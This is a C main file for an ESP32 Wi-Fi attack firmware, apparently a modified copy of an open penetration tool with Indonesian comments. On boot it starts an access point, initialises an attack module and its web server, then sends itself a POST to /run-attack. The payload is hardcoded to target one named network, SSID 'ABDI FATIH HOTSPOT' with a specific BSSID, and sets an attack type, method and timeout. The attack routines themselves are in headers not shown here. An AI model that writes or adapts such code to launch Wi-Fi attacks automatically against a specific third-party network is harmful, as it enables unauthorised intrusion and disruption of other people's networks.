/**
 * @file main.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-03
 * @copyright Copyright (c) 2021
 * 
 * @brief Main file used to setup ESP32 into initial state
 * 
 * Starts management AP and webserver  
 */

#include <stdio.h>

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_event.h"

#include "attack.h"
#include "wifi_controller.h"
#include "webserver.h"
#include "esp_http_client.h"

static const char* TAG = "main";



// Declare the HTTP event handler function
esp_err_t _http_event_handle(esp_http_client_event_t *evt);

void make_http_request(const char *url);
void make_http_post_request(const char *url, const char *post_payload);

void app_main(void)
{
    ESP_LOGD(TAG, "app_main started");
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    
    // Start management AP, initialize attack, and run the webserver
    wifictl_mgmt_ap_start();
    attack_init();
    webserver_run();

    // Make requests to different paths    // Default path
    //make_http_request("http://192.168.4.1/ap-list");
    make_http_request("http://192.168.4.1/status"); 
    make_http_request("http://192.168.4.1/ap-list");
    const char *post_url = "http://192.168.4.1/run-attack"; // Sesuaikan dengan URL yang benar
    const char *post_data = "{\"ssid\": \"ABDI FATIH HOTSPOT\",\"bssid\": \"EC:F0:FE:97:4E:88\", \"attack_type\": 1, \"attack_method\": 2, \"timeout\": 30}"; // Contoh payload, sesuaikan sesuai kebutuhan
    make_http_post_request(post_url, post_data);
    make_http_request("http://192.168.4.1/status");
    make_http_request("http://192.168.4.1/status"); 
    make_http_request("http://192.168.4.1/status");   
}
#define MAX_RESPONSE_SIZE 1024
char global_response_buffer[MAX_RESPONSE_SIZE];

// Define the HTTP event handler function
// Fungsi penanganan event HTTP
esp_err_t _http_event_handle(esp_http_client_event_t *evt) {
    switch(evt->event_id) {
        case HTTP_EVENT_ERROR:
            ESP_LOGI(TAG, "HTTP_EVENT_ERROR");
            break;
        case HTTP_EVENT_ON_CONNECTED:
            ESP_LOGI(TAG, "HTTP_EVENT_ON_CONNECTED");
            break;
        case HTTP_EVENT_HEADER_SENT:
            ESP_LOGI(TAG, "HTTP_EVENT_HEADER_SENT");
            break;
        case HTTP_EVENT_ON_HEADER:
            ESP_LOGI(TAG, "HTTP_EVENT_ON_HEADER");
            printf("%.*s", evt->data_len, (char*)evt->data);
            break;
        case HTTP_EVENT_ON_DATA:
            ESP_LOGI(TAG, "HTTP_EVENT_ON_DATA, len=%d", evt->data_len);
            if (!esp_http_client_is_chunked_response(evt->client)) {
                // Copy the response data to the global buffer
                if ((evt->data_len + 1) <= MAX_RESPONSE_SIZE) {
                    memcpy(global_response_buffer, evt->data, evt->data_len);
                    global_response_buffer[evt->data_len] = '\0';  // Null-terminate the string
                    printf("%s", global_response_buffer);  // Cetak data JSON
                } else {
                    ESP_LOGE(TAG, "Response data too large for the buffer");
                }
            }
            break;
        case HTTP_EVENT_ON_FINISH:
            ESP_LOGI(TAG, "HTTP_EVENT_ON_FINISH");
            break;
        case HTTP_EVENT_DISCONNECTED:
            ESP_LOGI(TAG, "HTTP_EVENT_DISCONNECTED");
            break;
    }
    return ESP_OK;
}

// Function to make HTTP requests
void make_http_request(const char *url) {
    esp_http_client_config_t config = {
        .url = url,
        .event_handler = _http_event_handle,
    };

    esp_http_client_handle_t client = esp_http_client_init(&config);
    esp_err_t err = esp_http_client_perform(client);

    if (err == ESP_OK) {
        ESP_LOGI(TAG, "Status = %d, content_length = %d",
                esp_http_client_get_status_code(client),
                esp_http_client_get_content_length(client));
    }

    esp_http_client_cleanup(client);
}

void make_http_post_request(const char *url, const char *post_payload) {
    esp_http_client_config_t config = {
        .url = url,
        .event_handler = _http_event_handle,
        // Menambahkan handler untuk event POST
        .method = HTTP_METHOD_POST,  // Mengatur metode request ke POST
        .user_data = global_response_buffer, // Buffer untuk menyimpan respons
        .buffer_size = MAX_RESPONSE_SIZE, // Ukuran buffer respons
    };

    esp_http_client_handle_t client = esp_http_client_init(&config);

    // Mengatur header Content-Type untuk JSON
    esp_http_client_set_header(client, "Content-Type", "application/json");

    // Menambahkan payload untuk request POST
    esp_http_client_set_post_field(client, post_payload, strlen(post_payload));

    // Melakukan request POST
    esp_err_t err = esp_http_client_perform(client);
    if (err == ESP_OK) {
        ESP_LOGI(TAG, "HTTP POST Status = %d, content_length = %d",
                 esp_http_client_get_status_code(client),
                 esp_http_client_get_content_length(client));
    } else {
        ESP_LOGE(TAG, "HTTP POST request failed: %s", esp_err_to_name(err));
    }

    // Membersihkan client
    esp_http_client_cleanup(client);
}